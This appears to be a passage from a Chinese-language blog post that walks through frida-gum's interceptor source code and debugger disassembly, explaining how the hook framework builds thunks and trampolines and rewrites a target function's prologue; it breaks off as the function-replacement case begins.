<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gum</span><br><span class="line">├── arch-arm</span><br><span class="line">├── arch-arm64</span><br><span class="line">├── arch-mips</span><br><span class="line">├── arch-x86</span><br><span class="line">├── backend-arm</span><br><span class="line">├── backend-arm64</span><br><span class="line">├── backend-darwin</span><br><span class="line">├── backend-dbghelp</span><br><span class="line">├── backend-elf</span><br><span class="line">├── backend-libdwarf</span><br><span class="line">├── backend-libunwind</span><br><span class="line">├── backend-linux</span><br><span class="line">├── backend-mips</span><br><span class="line">├── backend-posix</span><br><span class="line">├── backend-qnx</span><br><span class="line">├── backend-windows</span><br><span class="line">└── backend-x86</span><br><span class="line">....&#x2F;&#x2F; gum下其他文件</span><br></pre></td></tr></table></figure>

<p>这里有必要说一下，<code>frida-gum</code> 为了实现跨平台，抽象出来 <code>构架无关/平台无关/系统无关</code>的api，比如一些内存操作，在<code>frida-gum</code>里可能就是<code>gum_xxxxx</code>，但是根据不同平台，调用到对应平台的api里去，正是做了很好的封装，上层代码才会看起来“平台无关”。</p>
<p>还有几个核心的对象，后面的代码里频繁提及：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GumInterceptor</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  GObject parent;</span><br><span class="line"></span><br><span class="line">  GRecMutex mutex;</span><br><span class="line"></span><br><span class="line">  GHashTable * function_by_address;</span><br><span class="line"></span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line">  GumCodeAllocator allocator;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">volatile</span> guint selected_thread_id;</span><br><span class="line"></span><br><span class="line">  GumInterceptorTransaction current_transaction;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>从这个拦截器类索引出去的对象都需要好好注意，比如 <code>GumInterceptorBackend</code> , 最好可以生成一个uml图，阅读代码的时候对比着看。</p>
<h3 id="2-2-代码阅读"><a href="#2-2-代码阅读" class="headerlink" title="2.2. 代码阅读"></a>2.2. 代码阅读</h3><h4 id="2-2-1-准备工作"><a href="#2-2-1-准备工作" class="headerlink" title="2.2.1 准备工作"></a>2.2.1 准备工作</h4><p>面对比较大的代码，重要的是找到一个入口，从这个点开始读，我这里大概看了下单元测试的代码，发现基本是: 初始化，测试各种功能，清理，退出。</p>
<p>那么我的阅读思路就是 : </p>
<ol>
<li>初始化部分</li>
<li>各种功能，比如 内存模块，指令读写模块，代码修复模块</li>
<li>清理 这部分大概过一下就行</li>
</ol>
<p>这里我参考了 <code>jmpews</code>师傅的关于设计hook框架的文章，了解一个hook框架如何设计，分哪些模块，在阅读代码的时候能够有针对性一些。</p>
<ul>
<li>内存分配 模块 </li>
<li>指令写 模块 </li>
<li>指令读 模块 </li>
<li>指令修复 模块 relocator </li>
<li>跳板 模块 </li>
<li>调度器 模块 enter_thunk部分实现 </li>
<li>栈 模块</li>
</ul>
<p>具体可以参考他的文章: <a href="https://bbs.pediy.com/thread-220794.htm">如何构建一款像 frida 一样的框架</a></p>
<h4 id="2-2-2-hook从0到1"><a href="#2-2-2-hook从0到1" class="headerlink" title="2.2.2 hook从0到1"></a>2.2.2 hook从0到1</h4><p>阅读顺序根据单元测试<code>gum-test.c</code>确定的，具体的可以看代码</p>
<h5 id="gum-interceptor-obtain"><a href="#gum-interceptor-obtain" class="headerlink" title="gum_interceptor_obtain()"></a>gum_interceptor_obtain()</h5><p>这部分是 拦截器初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 初始化 interceptor 对象初始化</span></span><br><span class="line">GumInterceptor *</span><br><span class="line">gum_interceptor_obtain (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptor * interceptor;</span><br><span class="line"></span><br><span class="line">  g_mutex_lock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (_the_interceptor != <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    interceptor = GUM_INTERCEPTOR (g_object_ref (_the_interceptor));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _the_interceptor = g_object_new (GUM_TYPE_INTERCEPTOR, <span class="literal">NULL</span>);</span><br><span class="line">    g_object_weak_ref (G_OBJECT (_the_interceptor),</span><br><span class="line">        the_interceptor_weak_notify, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    interceptor = _the_interceptor;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  g_mutex_unlock (&amp;_gum_interceptor_lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> interceptor;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_init (GumInterceptor * self)</span><br><span class="line">&#123;</span><br><span class="line">  g_rec_mutex_init (&amp;self-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  self-&gt;function_by_address = g_hash_table_new_full (<span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>,</span><br><span class="line">      (GDestroyNotify) gum_function_context_destroy);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 分配器初始化</span></span><br><span class="line">  gum_code_allocator_init (&amp;self-&gt;allocator, GUM_INTERCEPTOR_CODE_SLICE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建拦截器后端</span></span><br><span class="line">  self-&gt;backend = _gum_interceptor_backend_create (&amp;self-&gt;allocator);</span><br><span class="line"></span><br><span class="line">  gum_interceptor_transaction_init (&amp;self-&gt;current_transaction, self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为GObject的使用，<code>gum_interceptor_init</code> 这个构造函数，在 <code>interceptor</code>对象创建出来的时候触发。</p>
<p>重点看拦截器后端的初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GumInterceptorBackend *</span><br><span class="line">_gum_interceptor_backend_create (GumCodeAllocator * allocator)</span><br><span class="line">&#123;</span><br><span class="line">  GumInterceptorBackend * backend;</span><br><span class="line"></span><br><span class="line">  backend = g_slice_new (GumInterceptorBackend);</span><br><span class="line">  backend-&gt;allocator = allocator;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//初始化 codewriter和relocator</span></span><br><span class="line">  gum_x86_writer_init (&amp;backend-&gt;writer, <span class="literal">NULL</span>);</span><br><span class="line">  gum_x86_relocator_init (&amp;backend-&gt;relocator, <span class="literal">NULL</span>, &amp;backend-&gt;writer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 创建 thunk</span></span><br><span class="line">  gum_interceptor_backend_create_thunks (backend);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> backend;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里初始化的<code>writer</code>和<code>relocator</code>分别用于指令写和指令恢复。</p>
<p><code>thunks</code>的初始化，这两个是用于调度执行，分别对应 进入hook和离开hook。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_backend_create_thunks (GumInterceptorBackend * self)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line"></span><br><span class="line">  self-&gt;enter_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;enter_thunk-&gt;data);</span><br><span class="line">  gum_emit_enter_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;enter_thunk-&gt;size);</span><br><span class="line"></span><br><span class="line">  self-&gt;leave_thunk = gum_code_allocator_alloc_slice (self-&gt;allocator);</span><br><span class="line">  gum_x86_writer_reset (cw, self-&gt;leave_thunk-&gt;data);</span><br><span class="line">  gum_emit_leave_thunk (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpuint (gum_x86_writer_offset (cw), &lt;=, self-&gt;leave_thunk-&gt;size);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为原理类似，只举例<code>enter_thunk</code></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_emit_enter_thunk (GumX86Writer * cw)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">const</span> gssize return_address_stack_displacement = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// save ret addr</span></span><br><span class="line">  gum_emit_prolog (cw, return_address_stack_displacement);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 构造自己的函数栈</span></span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XSI,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_CPU_CONTEXT);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XDX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_TOP);</span><br><span class="line">  gum_x86_writer_put_lea_reg_reg_offset (cw, GUM_REG_XCX,</span><br><span class="line">      GUM_REG_XBP, GUM_FRAME_OFFSET_NEXT_HOP);</span><br><span class="line"></span><br><span class="line">  gum_x86_writer_put_call_address_with_aligned_arguments (cw, GUM_CALL_CAPI,</span><br><span class="line">      GUM_ADDRESS (_gum_function_context_begin_invocation), <span class="number">4</span>,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XBX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XSI,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XDX,</span><br><span class="line">      GUM_ARG_REGISTER, GUM_REG_XCX);</span><br><span class="line"></span><br><span class="line">  gum_emit_epilog (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="gum-interceptor-attach-listener"><a href="#gum-interceptor-attach-listener" class="headerlink" title="gum_interceptor_attach_listener"></a>gum_interceptor_attach_listener</h5><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach_listener (GumInterceptor * self,</span><br><span class="line">                                 gpointer function_address,</span><br><span class="line">                                 GumInvocationListener * listener,</span><br><span class="line">                                 gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="gum-interceptor-transaction-begin"><a href="#gum-interceptor-transaction-begin" class="headerlink" title="gum_interceptor_transaction_begin"></a>gum_interceptor_transaction_begin</h6><h6 id="gum-interceptor-instrument-✨"><a href="#gum-interceptor-instrument-✨" class="headerlink" title="gum_interceptor_instrument ✨"></a>gum_interceptor_instrument ✨</h6><p>这里要说的是 function_address 就是要hook的目标函数，<code>frida-gum</code>把要hook的目标封装成了 <code>GumFunctionContext</code>对象，方便操作</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">function_address = gum_interceptor_resolve (self, function_address); <span class="comment">// ?</span></span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> GumFunctionContext *</span><br><span class="line">gum_interceptor_instrument (GumInterceptor * self,</span><br><span class="line">                            gpointer function_address)</span><br><span class="line">&#123;</span><br><span class="line">  GumFunctionContext * ctx;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 要hook的函数，封装成了 GumFunctionContext，此时</span></span><br><span class="line">  <span class="comment">// 根据 地址，得到与之对应的 GunFunctionContext对象</span></span><br><span class="line">  ctx = (GumFunctionContext *) g_hash_table_lookup (self-&gt;function_by_address,</span><br><span class="line">      function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> ctx;</span><br><span class="line">  <span class="comment">// 如果获取到的是空的对象，必须初始化了才能使用</span></span><br><span class="line">  <span class="comment">// 只写几个字断，分配内存/hook的函数地址/interceptor成员</span></span><br><span class="line">  ctx = gum_function_context_new (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="comment">// 创建跳板</span></span><br><span class="line">  <span class="keyword">if</span> (!_gum_interceptor_backend_create_trampoline (self-&gt;backend, ctx))</span><br><span class="line">  &#123;</span><br><span class="line">    gum_function_context_finalize (ctx);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置完成后， 添加到哈希表</span></span><br><span class="line">  <span class="comment">// hash_table, key, value</span></span><br><span class="line">  <span class="comment">// hook函数地址，GumFunctionContext对象对应， 方便查找</span></span><br><span class="line">  g_hash_table_insert (self-&gt;function_by_address, function_address, ctx);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> ctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里贴一下跳板代码方便理解：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; 跳到 leave_thunk</span><br><span class="line">&#x2F;&#x2F; 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure>

<h6 id="gum-interceptor-transaction-end"><a href="#gum-interceptor-transaction-end" class="headerlink" title="gum_interceptor_transaction_end"></a>gum_interceptor_transaction_end</h6><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前 transaction 添加到 任务中， 设置回调 函数 gum_interceptor_activate 拦截器激活函数</span></span><br><span class="line">  gum_interceptor_transaction_schedule_prologue_write (</span><br><span class="line">      &amp;self-&gt;current_transaction, ctx, gum_interceptor_activate);</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拦截器激活</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">gum_interceptor_activate (GumInterceptor * self,</span><br><span class="line">                          GumFunctionContext * ctx,</span><br><span class="line">                          gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (ctx-&gt;destroyed)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  g_assert (!ctx-&gt;activated);</span><br><span class="line">  ctx-&gt;activated = TRUE;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 激活</span></span><br><span class="line">  _gum_interceptor_backend_activate_trampoline (self-&gt;backend, ctx,</span><br><span class="line">      prologue);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_gum_interceptor_backend_activate_trampoline (GumInterceptorBackend * self,</span><br><span class="line">                                              GumFunctionContext * ctx,</span><br><span class="line">                                              gpointer prologue)</span><br><span class="line">&#123;</span><br><span class="line">  GumX86Writer * cw = &amp;self-&gt;writer;</span><br><span class="line">  guint padding;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置base</span></span><br><span class="line">  gum_x86_writer_reset (cw, prologue);</span><br><span class="line">  <span class="comment">// 设置pc</span></span><br><span class="line">  cw-&gt;pc = GPOINTER_TO_SIZE (ctx-&gt;function_address);</span><br><span class="line">  <span class="comment">// 写jmp， 跳转到 跳板中， 进入跳板这已经到hook里了</span></span><br><span class="line">  gum_x86_writer_put_jmp_address (cw, GUM_ADDRESS (ctx-&gt;on_enter_trampoline));</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">  g_assert_cmpint (gum_x86_writer_offset (cw),</span><br><span class="line">      &lt;=, GUM_INTERCEPTOR_REDIRECT_CODE_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 原本代码（hook点），剩余的地方nop补齐</span></span><br><span class="line">  padding = ctx-&gt;overwritten_prologue_len - gum_x86_writer_offset (cw);</span><br><span class="line">  <span class="keyword">for</span> (; padding != <span class="number">0</span>; padding--)</span><br><span class="line">    gum_x86_writer_put_nop (cw);</span><br><span class="line">  gum_x86_writer_flush (cw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-2-3-执行流程"><a href="#2-2-3-执行流程" class="headerlink" title="2.2.3 执行流程"></a>2.2.3 执行流程</h4><p>通过设置函数返回地址(<code>__gum_function_context_begin/end_invocation</code>)，控制流程，这就是ROP：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C80204</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">replacement_function</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板 02C8020F</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96;</span><br><span class="line">&#96;__gum_function_context_end_invocation&#96; </span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行</span><br></pre></td></tr></table></figure>

<h2 id="0x03-调试分析帮助理解"><a href="#0x03-调试分析帮助理解" class="headerlink" title="0x03 : 调试分析帮助理解"></a>0x03 : 调试分析帮助理解</h2><p>这里调试了单元测试中写hook和函数替换的逻辑，过程如下：</p>
<p><code>_gum_interceptor_backend_create() </code></p>
<p>后端初始化，初始化两个thunk</p>
<p>enter_thunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C30000  pushfd  </span><br><span class="line">00C30001  cld  </span><br><span class="line">00C30002  pushad  </span><br><span class="line">00C30003  lea         esp,[esp-4]  </span><br><span class="line">00C3000A  lea         eax,[esp+2Ch]  </span><br><span class="line">00C30011  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30015  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30019  mov         ebp,esp  </span><br><span class="line">00C3001B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30021  sub         esp,200h  </span><br><span class="line">00C30027  fxsave      [esp]  </span><br><span class="line">00C3002B  lea         esi,[ebp]  </span><br><span class="line">00C30031  lea         edx,[ebp+2Ch]  </span><br><span class="line">00C30037  lea         ecx,[ebp+28h]  </span><br><span class="line">00C3003D  push        ecx  </span><br><span class="line">00C3003E  push        edx  </span><br><span class="line">00C3003F  push        esi  </span><br><span class="line">00C30040  push        ebx  </span><br><span class="line">00C30041  call        __gum_function_context_begin_invocation (0CE8E1Fh)  </span><br><span class="line">00C30046  add         esp,10h  </span><br><span class="line">00C30049  fxrstor     [esp]  </span><br><span class="line">00C3004D  mov         esp,ebp  </span><br><span class="line">00C3004F  lea         esp,[esp+4]  </span><br><span class="line">00C30056  popad  </span><br><span class="line">00C30057  popfd  </span><br><span class="line">00C30058  ret </span><br></pre></td></tr></table></figure>


<p>leave_thunk</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C30100  pushfd  </span><br><span class="line">00C30101  cld  </span><br><span class="line">00C30102  pushad  </span><br><span class="line">00C30103  lea         esp,[esp-4]  </span><br><span class="line">00C3010A  lea         eax,[esp+28h]  </span><br><span class="line">00C30111  mov         dword ptr [esp+10h],eax  </span><br><span class="line">00C30115  mov         ebx,dword ptr [esp+28h]  </span><br><span class="line">00C30119  mov         ebp,esp  </span><br><span class="line">00C3011B  and         esp,0FFFFFFF0h  </span><br><span class="line">00C30121  sub         esp,200h  </span><br><span class="line">00C30127  fxsave      [esp]  </span><br><span class="line">00C3012B  lea         esi,[ebp]  </span><br><span class="line">00C30131  lea         edx,[ebp+28h]  </span><br><span class="line">00C30137  sub         esp,4  </span><br><span class="line">00C3013A  push        edx  </span><br><span class="line">00C3013B  push        esi  </span><br><span class="line">00C3013C  push        ebx  </span><br><span class="line">00C3013D  call        __gum_function_context_end_invocation (0CEAB1Bh)  </span><br><span class="line">00C30142  add         esp,0Ch  </span><br><span class="line">00C30145  add         esp,4  </span><br><span class="line">00C30148  fxrstor     [esp]  </span><br><span class="line">00C3014C  mov         esp,ebp  </span><br><span class="line">00C3014E  lea         esp,[esp+4]  </span><br><span class="line">00C30155  popad  </span><br><span class="line">00C30156  popfd  </span><br><span class="line">00C30157  ret  </span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hook 构造</span></span><br><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">GumAttachReturn</span><br><span class="line">gum_interceptor_attach (GumInterceptor * self,</span><br><span class="line">                        gpointer function_address,</span><br><span class="line">                        GumInvocationListener * listener,</span><br><span class="line">                        gpointer listener_function_data)</span><br><span class="line">&#123;</span><br><span class="line">  GumAttachReturn result = GUM_ATTACH_OK;</span><br><span class="line">  GumFunctionContext * function_ctx;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_process_get_code_signing_policy () == GUM_CODE_SIGNING_REQUIRED)</span><br><span class="line">    <span class="keyword">goto</span> policy_violation;</span><br><span class="line"></span><br><span class="line">  gum_interceptor_ignore_current_thread (self);</span><br><span class="line">  GUM_INTERCEPTOR_LOCK (self);</span><br><span class="line">  gum_interceptor_transaction_begin (&amp;self-&gt;current_transaction);</span><br><span class="line">  self-&gt;current_transaction.is_dirty = TRUE;</span><br><span class="line">	</span><br><span class="line">  <span class="comment">// 获取hook目标函数的地址 </span></span><br><span class="line">  function_address = gum_interceptor_resolve (self, function_address);</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// 获取这个函数的 GumFunctionContext 对象</span></span><br><span class="line">  <span class="comment">// 没有就新建一个</span></span><br><span class="line">  <span class="comment">// 这里已经 准备好了跳板，写好了hook</span></span><br><span class="line">  <span class="comment">// 添加任务,设置相对应的回调函数</span></span><br><span class="line">  function_ctx = gum_interceptor_instrument (self, function_address);</span><br><span class="line">  <span class="keyword">if</span> (function_ctx == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">goto</span> wrong_signature;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (gum_function_context_has_listener (function_ctx, listener))</span><br><span class="line">    <span class="keyword">goto</span> already_attached;</span><br><span class="line">  <span class="comment">// 添加监听器</span></span><br><span class="line">  gum_function_context_add_listener (function_ctx, listener,</span><br><span class="line">      listener_function_data);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">goto</span> beach;</span><br><span class="line"></span><br><span class="line">policy_violation:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> GUM_ATTACH_POLICY_VIOLATION;</span><br><span class="line">  &#125;</span><br><span class="line">wrong_signature:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_WRONG_SIGNATURE;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">already_attached:</span><br><span class="line">  &#123;</span><br><span class="line">    result = GUM_ATTACH_ALREADY_ATTACHED;</span><br><span class="line">    <span class="keyword">goto</span> beach;</span><br><span class="line">  &#125;</span><br><span class="line">beach:</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">// 到这里，基本没什么问题，hook什么都打好了</span></span><br><span class="line">    <span class="comment">// 拦截器激活 跳板激活</span></span><br><span class="line">    <span class="comment">// 这里把原函数开头改写</span></span><br><span class="line">    gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</span><br><span class="line">    GUM_INTERCEPTOR_UNLOCK (self);</span><br><span class="line">    gum_interceptor_unignore_current_thread (self);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>on_invoke_trampoline 跳板</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C30200  mov         al,byte ptr ds:[FF00C121h]  </span><br><span class="line">00C30205  xor         eax,0C30200h  </span><br><span class="line">00C3020A  jmp         00C30000   &#x2F;&#x2F; 跳到上面的 enter_thunk</span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  &#x2F;&#x2F; 跳到 leave_thunk</span><br><span class="line">&#x2F;&#x2F; 原函数修复的指令，7个字节</span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h) &#x2F;&#x2F; 跳回原函数，因为写跳转用了7字节，所以+7</span><br></pre></td></tr></table></figure>



<p><code>gum_interceptor_transaction_end (&amp;self-&gt;current_transaction);</code> 调用 <code>gum_interceptor_activate()</code> 然后<code>_gum_interceptor_backend_activate_trampolie()</code> 随后，目标函数开头被修改：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gpointer GUM_NOINLINE</span><br><span class="line">gum_test_target_function (GString * str)</span><br><span class="line">&#123;</span><br><span class="line"><span class="number">00</span>D6FB90  jmp         <span class="number">00</span>C30204  </span><br><span class="line">  <span class="keyword">if</span> (str != <span class="literal">NULL</span>)</span><br><span class="line"><span class="number">00</span>D6FB95  nop  </span><br><span class="line"><span class="number">00</span>D6FB96  nop  </span><br><span class="line"><span class="number">00</span>D6FB97  je          gum_test_target_function+<span class="number">19</span>h (<span class="number">0</span>D6FBA9h)  </span><br></pre></td></tr></table></figure>

<p>直接跳转到 <code>00C30204</code>, 其实就是 跳板，因为反汇编的地址差了点，所以开始的指令不太一样:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">00C30204  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C3020A  jmp         00C30000  </span><br><span class="line">00C3020F  push        dword ptr ds:[0C30200h]  </span><br><span class="line">00C30215  jmp         00C30100  </span><br><span class="line">00C3021A  push        ebp  </span><br><span class="line">00C3021B  mov         ebp,esp  </span><br><span class="line">00C3021D  cmp         dword ptr [ebp+8],0  </span><br><span class="line">00C30221  jmp         gum_test_target_function+7h (0D6FB97h)  </span><br><span class="line">00C30226  add         byte ptr [eax],al  </span><br><span class="line">00C30228  add         byte ptr [eax],al  </span><br><span class="line">00C3022A  add         byte ptr [eax],al  </span><br><span class="line">00C3022C  add         byte ptr [eax],al  </span><br><span class="line">00C3022E  add         byte ptr [eax],al  </span><br></pre></td></tr></table></figure>

<p>调用流程调试分析，这里分两个情况，是否存在``replacement_function`</p>
<p>首先是不存在，只是打个hook(根据 <code>TESTCASE(attach_one);</code>)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">call 原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;enter_chunk&#96;  &#x2F;&#x2F; 首先要保存现场, 构造栈帧，随后进入下一个函数 ⬇️</span><br><span class="line">&#96;__gum_function_context_begin_invocation&#96; &#x2F;&#x2F; 通过设置栈(ret addr)控制执行流程 </span><br><span class="line">----------------------------------------------------</span><br><span class="line">跳板+n  (00C3021A) &#x2F;&#x2F; 执行原函数的 修复的若干字节</span><br><span class="line">----------------------------------------------------</span><br><span class="line">原函数</span><br><span class="line">----------------------------------------------------</span><br><span class="line">&#96;leave_chunk&#96; </span><br><span class="line">&#96;__gum_function_context_end_invocation&#96;</span><br><span class="line">----------------------------------------------------</span><br><span class="line">继续执行....</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>存在替换的函数(<code>TESTCASE(replace_one);</code>)</p>
